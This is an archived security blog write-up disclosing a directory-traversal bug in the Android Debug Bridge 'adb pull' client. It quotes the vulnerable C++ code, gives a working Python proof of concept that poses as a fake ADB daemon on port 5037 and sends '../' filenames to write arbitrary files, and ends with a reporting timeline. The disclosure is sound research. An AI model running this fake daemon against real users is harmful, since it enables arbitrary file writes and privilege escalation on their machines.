---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-19_arbitrary-file-write-on-client-by-adb-pull.md
original_filename: 2020-11-19_arbitrary-file-write-on-client-by-adb-pull.md
title: Arbitrary File Write On Client By ADB Pull
category: documents
detected_topics:
- access-control
- command-injection
- path-traversal
- api-security
- mobile-security
tags:
- imported
- documents
- access-control
- command-injection
- path-traversal
- api-security
- mobile-security
language: en
raw_sha256: 842b7cb93135a10ff1afec64aa69fb91cf61b01b1e8da3e8c4db6b966e2598f9
text_sha256: cf5fbc767934f2af2ffd5732692df7b2c534342f8a7a75f9952cc9ab8b490716
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Arbitrary File Write On Client By ADB Pull

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-19_arbitrary-file-write-on-client-by-adb-pull.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, path-traversal, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `842b7cb93135a10ff1afec64aa69fb91cf61b01b1e8da3e8c4db6b966e2598f9`
- Text SHA256: `cf5fbc767934f2af2ffd5732692df7b2c534342f8a7a75f9952cc9ab8b490716`


## Content

---
title: "Arbitrary File Write On Client By ADB Pull"
url: "https://daeken.svbtle.com/arbitrary-file-write-by-adb-pull"
final_url: "https://daeken.svbtle.com/arbitrary-file-write-by-adb-pull"
authors: ["Serafina (Sera) Tonin Brocious (@daeken)"]
programs: ["Google"]
bugs: ["Arbitrary file write"]
publication_date: "2020-11-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4118
---

November 19, 2020

#  [Arbitrary File Write On Client By ADB Pull](https://daeken.svbtle.com/arbitrary-file-write-by-adb-pull)

The Android Debug Bridge, ADB, contains a long-standing vulnerability. It can have a rather severe impact, but only under some pretty unusual circumstances. Tl;dr: Executing an `adb pull` command against a malicious Android device or ADB daemon can lead to arbitrary file writes, pretty easily escalating to code execution.

# ADB Architecture #

There are three notable pieces worth discussing, when it comes to ADB:

  * Device-side ADB server (this runs on your Android device and facilitates debugging, running shells, etc)
  * ADB daemon (this runs on your machine on port 5037 and talks to the device side, acting as a dumb proxy)
  * ADB client (this talks to the ADB daemon)

# Pull process #

We’re going to examine what happens if you run a simple pull command: `adb pull /foo`

  1. The ADB client (hereafter just referred to as `ADB`) attempts to connect to localhost:5037 
  * If it fails to connect, the ADB daemon is started automatically
  2. ADB opens the `sync` service on the device
  3. ADB sends a `STAT` message (equivalent to the syscall) for `/foo` to determine if it’s a file or directory
  4. If it’s a file, it simply sends a `RECV` message to get the contents, and writes to a local file called `foo`
  5. If it’s a directory, ADB sends a `LIST` message to get the directory contents, then recurses into any subsequent directories, creating them and pulling contents as needed

Pulling a file isn’t very interesting and there’s no need to dive into it here, but the fact that `pull` doesn’t differentiate between files and directories (from a UI standpoint) is interesting. This means that unless you’re 100% certain of what you’re pulling, you might get a directory instead of a file, or vice versa.

# The Bug #

The vulnerable code here is in [file_sync_client.cpp](https://android.googlesource.com/platform/system/adb/+/e1bcd152f0248582c533522087df4ed8eb523296/file_sync_client.cpp):
  
  
  static bool remote_build_list(SyncConnection& sc, std::vector<copyinfo>* file_list,
  const std::string& rpath, const std::string& lpath) {
  std::vector<copyinfo> dirlist;
  std::vector<copyinfo> linklist;
  
  // Add an entry for the current directory to ensure it gets created before pulling its contents.
  copyinfo ci(android::base::Dirname(lpath), android::base::Dirname(rpath),
  android::base::Basename(lpath), S_IFDIR);
  file_list->push_back(ci);
  
  // Put the files/dirs in rpath on the lists.
  auto callback = [&](unsigned mode, uint64_t size, uint64_t time, const char* name) {
  if (IsDotOrDotDot(name)) {
  return;
  }
  
  copyinfo ci(lpath, rpath, name, mode);
  if (S_ISDIR(mode)) {
  dirlist.push_back(ci);
  } else if (S_ISLNK(mode)) {
  linklist.push_back(ci);
  } else {
  if (!should_pull_file(ci.mode)) {
  sc.Warning("skipping special file '%s' (mode = 0o%o)", ci.rpath.c_str(), ci.mode);
  ci.skip = true;
  }
  ci.time = time;
  ci.size = size;
  file_list->push_back(ci);
  }
  };
  
  if (!sync_ls(sc, rpath, callback)) {
  return false;
  }
  
  // Check each symlink we found to see whether it's a file or directory.
  for (copyinfo& link_ci : linklist) {
  struct stat st;
  if (!sync_stat_fallback(sc, link_ci.rpath, &st)) {
  sc.Warning("stat failed for path %s: %s", link_ci.rpath.c_str(), strerror(errno));
  continue;
  }
  
  if (S_ISDIR(st.st_mode)) {
  dirlist.emplace_back(std::move(link_ci));
  } else {
  file_list->emplace_back(std::move(link_ci));
  }
  }
  
  // Recurse into each directory we found.
  while (!dirlist.empty()) {
  copyinfo current = dirlist.back();
  dirlist.pop_back();
  if (!remote_build_list(sc, file_list, current.rpath, current.lpath)) {
  return false;
  }
  }
  
  return true;
  }
  

This recursively builds the list of files to pull. To prevent loops, it doesn’t recurse into directories named `.` or `..`. Good! Unfortunately, it does no validation on filenames whatsoever. So if a malicious ADB daemon (or device-side ADB service) were to send such a file back, we end up with a directory traversal.

# Proof of Concept #

The following is a Python 2.7 (don’t @ me) proof of concept for this bug:
  
  
  from socket import *
  import struct, thread
  
  S_IFDIR = 0040777
  S_IFREG = 0100600
  
  DIR = S_IFDIR
  FILE = S_IFREG
  
  def pathInfo(path):
  print 'Returning path info for:', path
  if path == '/exploit':
  return DIR, 0
  elif '..' in path:
  return FILE, len(pathContents(path))
  return 0, 0
  
  def pathList(path):
  print 'Returning path list for:', path
  if path == '/exploit/':
  return ['../../../../../../../../../../../../../../../tmp/TESTING']
  return []
  
  def pathContents(path):
  return 'ADB directory traversal test. Have a pleasant day!'
  
  class Client(object):
  def __init__(self, sock):
  self.sock = sock
  self.transportId = 0
  
  print 'Running loop for client'
  self.loop()
  print 'Closing client socket'
  self.sock.close()
  
  def recvall(self, count):
  print 'Receiving', count
  buf = ''
  while len(buf) < count:
  tbuf = self.sock.recv(count - len(buf))
  if tbuf == '':
  raise Exception('Disconnected')
  buf += tbuf
  print `buf`
  return buf
  
  def recvbuf(self):
  return self.recvall(int(self.recvall(4), 16))
  
  def sendall(self, buf):
  return self.sock.sendall(buf)
  
  def sendbuf(self, buf):
  return self.sock.sendall(('%04x' % len(buf)) + buf)
  
  def handle_connect(self):
  name = self.recvbuf()
  print 'Connecting to service:', `name`
  self.sendall('OKAY')
  print 'Returned OKAY'
  
  if name == 'host:version':
  print 'Sending version'
  self.sendbuf('%04x' % 41)
  return False
  elif name == 'host:features':
  print 'Sending features'
  self.sendbuf('cmd,stat_v2,ls_v2,libusb,push_sync,apex,fixed_push_mkdir,abb,fixed_push_symlink_timestamp,abb_exec,track_app')
  return False
  elif name == 'host:tport:any':
  self.sendall(struct.pack('<Q', self.transportId))
  self.transportId += 1
  elif name == 'sync:':
  self.sync()
  return False
  elif name.startswith('shell:'):
  print 'Trying to run command, lol'
  self.sendall('10. Not supported\n')
  return False
  elif name == 'host:kill':
  print 'No mere mortal can kill me'
  return False
  
  def sync(self):
  while True:
  id = self.recvall(4)
  path_len, = struct.unpack('<I', self.recvall(4))
  path = self.recvall(path_len)
  print `id`, 'on', `path`
  if id == 'STA2':
  self.sendall(id)
  mode, size = pathInfo(path)
  self.sendall(struct.pack('<IQQIIIIQqqq',
  0,  # error
  0,  # dev
  0,  # ino
  mode, # mode
  0,  # nlink
  0,  # uid
  0,  # gid
  size, # size
  0,  # atime
  0,  # mtime
  0  # ctime
  ))
  elif id == 'STAT':
  self.sendall(id)
  mode, size = pathInfo(path)
  self.sendall(struct.pack('<III',
  mode, # mode
  size, # size
  0  # mtime
  ))
  elif id == 'LIS2':
  for name in list(pathList(path)) + ['~~~DONE~~~']:
  if name != '~~~DONE~~~':
  self.sendall('DNT2')
  mode, size = pathInfo(path + name)
  else:
  self.sendall('DONE')
  mode, size = 0, 0
  self.sendall(struct.pack('<IQQIIIIQqqqI',
  0,  # error
  0,  # dev
  0,  # ino
  mode, # mode
  0,  # nlink
  0,  # uid
  0,  # gid
  size, # size
  0,  # atime
  0,  # mtime
  0,  # ctime
  len(name) if name != '~~~DONE~~~' else 0
  ))
  if name != '~~~DONE~~~':
  self.sendall(name)
  elif id == 'LIST':
  for name in list(pathList(path)) + ['~~~DONE~~~']:
  if name != '~~~DONE~~~':
  self.sendall('DENT')
  mode, size = pathInfo(path + name)
  else:
  self.sendall('DONE')
  mode, size = 0, 0
  self.sendall(struct.pack('<IIII',
  mode, # mode
  size, # size
  0,  # mtime
  len(name) if name != '~~~DONE~~~' else 0
  ))
  if name != '~~~DONE~~~':
  self.sendall(name)
  elif id == 'RECV':
  contents = pathContents(path)
  for i in xrange(0, len(contents), 65536):
  data = contents[i:i+65536]
  print 'Sending', `data`
  self.sendall('DATA')
  self.sendall(struct.pack('<I', len(data)))
  self.sendall(data)
  self.sendall('DONE\0\0\0\0')
  print 'Done??'
  elif id == 'QUIT':
  break
  else:
  print 'Unknown command in sync:', `id`
  
  def loop(self):
  while True:
  print 'In loop'
  if self.handle_connect() is False:
  break
  
  serv = socket(AF_INET, SOCK_STREAM)
  serv.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
  serv.bind(('', 5037))
  serv.listen(10)
  
  while True:
  sock, _ = serv.accept()
  thread.start_new_thread(Client, (sock, ))
  

Steps:

  1. Run this file
  2. Run `adb pull /exploit`
  3. Run `cat /tmp/TESTING`

You can see from the `pathList()` and `pathContents()` functions that it’s trivial to write any file on the filesystem. Bear in mind, this happens in the context of the user running the ADB client, so you’re limited to files they can write. However, that makes it pretty great for privilege escalation on a multi-user system.

# Future Work #

As mentioned earlier, it may be possible to exploit this via a device with a malicious ADB service present. This is left as an exercise to the reader.

# Reporting Timeline #

  * Reported to Google on November 11, 2020
  * Determined to be ineligible for Android’s bug bounty program on November 18, 2020 (While I would’ve hoped for this to be otherwise, it’s understandable – it requires very specific circumstances to exploit) 
  * It should be noted that if proof of exploitability from a malicious device were presented, this may reverse the decision
  * Disclosed November 19, 2020

33

Kudos

33

Kudos
